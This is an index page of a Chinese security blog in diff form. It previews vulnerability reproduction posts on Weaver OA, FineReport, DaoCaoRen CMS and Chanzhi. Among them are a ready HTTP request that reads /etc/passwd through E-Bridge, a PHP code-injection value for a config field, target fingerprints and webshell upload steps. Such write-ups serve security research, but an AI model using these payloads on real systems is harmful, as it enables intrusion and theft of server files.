@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/page/12/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+
+    
+    <article id="post-泛微oa/泛微OA E-cology _=9.0 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20E-cology%20_=9.0%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.918Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="泛微OA-E-cology-lt-9-0-远程代码执行漏洞"><a href="#泛微OA-E-cology-lt-9-0-远程代码执行漏洞" class="headerlink" title="泛微OA E-cology &lt;=9.0 远程代码执行漏洞"></a>泛微OA E-cology &lt;=9.0 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology<br>OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口,<br>可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行,<br>漏洞等级严重.</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>e-cology &lt;=9.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h3><pre><code>Set-Cookie: ecology_JSessionId=
+</code></pre>
+<p>ecology</p>
+<pre><code>/weaver/bsh.servlet.BshServlet
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20E-cology%20_=9.0%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%20E-cology%20_=9.0%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2r05t00p4y8v11nq25tjd" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-泛微oa/泛微 E-Bridge 云桥任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20E-Bridge%20%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.914Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="泛微-E-Bridge-云桥任意文件读取"><a href="#泛微-E-Bridge-云桥任意文件读取" class="headerlink" title="泛微 E-Bridge 云桥任意文件读取"></a>泛微 E-Bridge 云桥任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>泛微云桥（E-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>2018-2019 多个版本。</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="服务器Linux："><a href="#服务器Linux：" class="headerlink" title="服务器Linux："></a>服务器Linux：</h3><pre><code>GET /wxjsapi/saveYZJFile?fileName=test&amp;downloadUrl=file:///etc/passwd&amp;fileExt=txt HTTP/1.1
+Host: www.0-sec.org:8088
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: ecology_JSessionId=abc3I_8E3ZP75a_tnGnrx; testBanCookie=test; JSESSIONID=3kqlxwz8wo04x6cs4dlaovn; EBRIDGE_JSESSIONID=3DD7A4B45D85CAE1AC75F8FF6DEB7556
+Connection: close
+</code></pre>
+<p><img src="/resource/%E6%B3%9B%E5%BE%AEE-Bridge%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId25.png" alt="1.png"></p>
+<h3 id="windows服务器："><a href="#windows服务器：" class="headerlink" title="windows服务器："></a>windows服务器：</h3>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20E-Bridge%20%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AE%20E-Bridge%20%E4%BA%91%E6%A1%A5%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2r05q00p3y8v1hp558yuv" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-帆软报表/帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.873Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="帆软报表-v8-0-任意文件读取漏洞-CNVD-2018-04757"><a href="#帆软报表-v8-0-任意文件读取漏洞-CNVD-2018-04757" class="headerlink" title="帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757"></a>帆软报表 v8.0 任意文件读取漏洞 CNVD-2018-04757</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>FineReport报表软件是一款纯Java编写的，集数据展示(报表)和数据录入(表单)功能于一身的企业级web报表工具。</p>
+<p>FineReport v8.0版本存在任意文件读取漏洞，攻击者可利用漏洞读取网站任意文件。</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p><code>FineReport &lt; v8.0</code></p>
+<h2 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h2><p><code>body=&quot;isSupportForgetPwd&quot;</code></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>出现漏洞的文件为 fr-applet-8.0.jar</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20v8.0%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757/" data-id="cl5c2r04r00p2y8v140ws9gfy" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-帆软报表/帆软 V9 任意文件覆盖文件上传" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8/%E5%B8%86%E8%BD%AF%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.871Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="帆软-V9-任意文件覆盖文件上传"><a href="#帆软-V9-任意文件覆盖文件上传" class="headerlink" title="帆软 V9 任意文件覆盖文件上传"></a>帆软 V9 任意文件覆盖文件上传</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>帆软 V9 存在任意文件覆盖，导致攻击者可以任意文件上传</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><blockquote>
+<p>[!NOTE]</p>
+<p>帆软 V9 </p>
+</blockquote>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><code>FineReport V9</code></p>
+<p>注意: 这个漏洞是任意文件覆盖，上传 JSP 马，需要找已存在的 jsp 文件进行覆盖 Tomcat 启动帆软后默认存在的 JSP 文件:</p>
+<p><code>比如:/tomcat-7.0.96/webapps/ROOT/index.jsp</code></p>
+<p>覆盖 Tomcat 自带 ROOT 目录下的 index.jsp:</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8/%E5%B8%86%E8%BD%AF%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8/%E5%B8%86%E8%BD%AF%20V9%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="cl5c2r04r00p1y8v1hfqpa6yw" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-稻草人cms/稻草人cms 1.1.5 安装过程信息泄露和getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E7%A8%BB%E8%8D%89%E4%BA%BAcms/%E7%A8%BB%E8%8D%89%E4%BA%BAcms%201.1.5%20%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8Cgetshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.793Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="稻草人cms-1-1-5-安装过程信息泄露和getshell"><a href="#稻草人cms-1-1-5-安装过程信息泄露和getshell" class="headerlink" title="稻草人cms 1.1.5 安装过程信息泄露和getshell"></a>稻草人cms 1.1.5 安装过程信息泄露和getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>稻草人cms 1.1.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>安装时使用D盾来做文件监控，bp重新发包抓包。我们先看安装之后的：</p>
+<p><img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8Cgetshell/media/rId24.png" alt="1.png">这里看到txt文件，访问一下<img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8Cgetshell/media/rId25.png" alt="2.png"><img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8Cgetshell/media/rId26.png" alt="3.png">可以看到有敏感信息泄露而且通过D盾文件监控我们发现有配置文件的写入<img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8Cgetshell/media/rId27.png" alt="4.png">根据经验，我们测试一下内容可不可控，如果可控我们可以想办法写木马进去。经过测试，（这里正常回显不报错），</p>
+<pre><code>tablepre=dcr_qy_&#39;;?&gt;&lt;?php phpinfo()?&gt;
+</code></pre>
+<p><img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8Cgetshell/media/rId28.png" alt="5.png"><img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8Cgetshell/media/rId29.png" alt="6.png">成功写入--我们去看一下源码：<img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8Cgetshell/media/rId30.png" alt="7.png">可以看到这里就是我们的写入点这里虽然引入了配置文件起到了过滤作用，但是并没有对我们写入做任何限制--</p>
+<pre><code>include &quot;../include/common.func.php&quot;;
+include &quot;../include/app.info.php&quot;;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E7%A8%BB%E8%8D%89%E4%BA%BAcms/%E7%A8%BB%E8%8D%89%E4%BA%BAcms%201.1.5%20%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8Cgetshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%A8%BB%E8%8D%89%E4%BA%BAcms/%E7%A8%BB%E8%8D%89%E4%BA%BAcms%201.1.5%20%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%92%8Cgetshell/" data-id="cl5c2r04q00p0y8v17rj7h6mv" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-稻草人cms/稻草人cms 1.1.5 后台任意文件删除" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E7%A8%BB%E8%8D%89%E4%BA%BAcms/%E7%A8%BB%E8%8D%89%E4%BA%BAcms%201.1.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.791Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="稻草人cms-1-1-5-后台任意文件删除"><a href="#稻草人cms-1-1-5-后台任意文件删除" class="headerlink" title="稻草人cms 1.1.5 后台任意文件删除"></a>稻草人cms 1.1.5 后台任意文件删除</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>稻草人cms 1.1.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>关于后台功能点任意文件删除这个严格来讲我认为不算漏洞，后台管理员赋予你的高权限使得你这里可以达到任意文件删除。。网上有的师傅认为后台文件任意文件删除是漏洞，这里拿出来写一下吧233</p>
+<p>先创建一个文件测试<img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId24.png" alt="11.png"></p>
+<p>我们将当前目录下的robots.php修改成test.php试试<img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId25.png" alt="2.png"><br><img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId26.png" alt="3.png"></p>
+<p>删除文件成功。</p>
+<p>我们来看代码<br><img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/media/rId27.png" alt="4.png"><br>这里cpath变量可控，当?action=del_file时导致我们达成任意文件删除</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E7%A8%BB%E8%8D%89%E4%BA%BAcms/%E7%A8%BB%E8%8D%89%E4%BA%BAcms%201.1.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%A8%BB%E8%8D%89%E4%BA%BAcms/%E7%A8%BB%E8%8D%89%E4%BA%BAcms%201.1.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" data-id="cl5c2r04p00oyy8v19agc1ayw" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-稻草人cms/稻草人cms 1.1.5 后台任意文件上传导致getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E7%A8%BB%E8%8D%89%E4%BA%BAcms/%E7%A8%BB%E8%8D%89%E4%BA%BAcms%201.1.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.787Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="稻草人cms-1-1-5-后台任意文件上传导致getshell"><a href="#稻草人cms-1-1-5-后台任意文件上传导致getshell" class="headerlink" title="稻草人cms 1.1.5 后台任意文件上传导致getshell"></a>稻草人cms 1.1.5 后台任意文件上传导致getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>稻草人cms 1.1.5</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先进去后台，我们黑盒测试一下上传点，这里很多图片上传点我们随便找一个上传php文件<img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/media/rId24.png" alt="1.png">这个好像是只对<strong>Content-Type:</strong> 做了判断，我们来验证一下<img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/media/rId25.png" alt="2.png"></p>
+<p>这里回显正常而且前端直接暴露了我们上传的地址，直接上蚁剑连接：<img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/media/rId26.png" alt="3.png">成功getshell。事实上后台所有能上传图片的地方都是通过这种方式验证，导致我们可以在多处getshell。我们看一下代码include/class/class.upload.php<img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/media/rId27.png" alt="4.png"><img src="/resource/%E7%A8%BB%E8%8D%89%E4%BA%BAcms1.1.5%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/media/rId28.png" alt="5.png">这里仅仅对文件类型通过allow_files<br>这个数组中的白名单检测，导致我们可以轻松绕过--</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7904/#toc-1">https://xz.aliyun.com/t/7904\#toc-1</a></p>
+</blockquote>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E7%A8%BB%E8%8D%89%E4%BA%BAcms/%E7%A8%BB%E8%8D%89%E4%BA%BAcms%201.1.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%A8%BB%E8%8D%89%E4%BA%BAcms/%E7%A8%BB%E8%8D%89%E4%BA%BAcms%201.1.5%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AF%BC%E8%87%B4getshell/" data-id="cl5c2r04q00ozy8v170dmckba" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-禅知/禅知后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E7%A6%85%E7%9F%A5/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.733Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="禅知-后台getshell"><a href="#禅知-后台getshell" class="headerlink" title="禅知 后台getshell"></a>禅知 后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>后台存在模板编辑，但是如果保存的话需要创建一个/system\tmp\xjrg.txt文件，那么我们找到一个可以创建任意文件的地方就</p>
+<p><img src="/resource/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/media/rId24.png"></p>
+<p>在/system/module/wechat/model.php</p>
+<p><img src="/resource/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/media/rId25.png"></p>
+<p>$qrcodeFile未过滤目录穿越导致可以去其他地方创建文件夹通过微信设置原始ID的地方写入穿越的文件路径</p>
+<p><img src="/resource/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/media/rId26.png"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E7%A6%85%E7%9F%A5/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%A6%85%E7%9F%A5/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2r02y00oxy8v108bw35ch" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
